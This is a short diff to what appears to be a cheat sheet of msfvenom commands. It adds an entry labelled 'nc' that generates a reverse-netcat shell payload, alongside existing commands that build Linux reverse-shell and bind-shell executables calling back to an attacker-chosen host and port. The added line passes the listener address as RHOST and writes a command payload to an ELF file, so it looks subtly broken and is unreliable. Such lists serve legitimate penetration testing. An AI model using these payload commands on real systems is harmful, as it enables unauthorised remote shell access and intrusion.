@@ -41,6 +41,9 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=#{LHOST} LPORT=#{LPORT} -f e
 # desc: Linux Reverse Shell x64
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=#{LHOST} LPORT=#{LPORT} -f elf > shell.elf
 
+# desc: nc
+msfvenom -p cmd/unix/reverse_netcat RHOST=#{LHOST} LPORT=#{LPORT} -f elf > shell.elf
+
 # desc: Linux Bind Shell
 msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=#{LHOST} LPORT=#{LPORT} -f elf > bind.elf
 
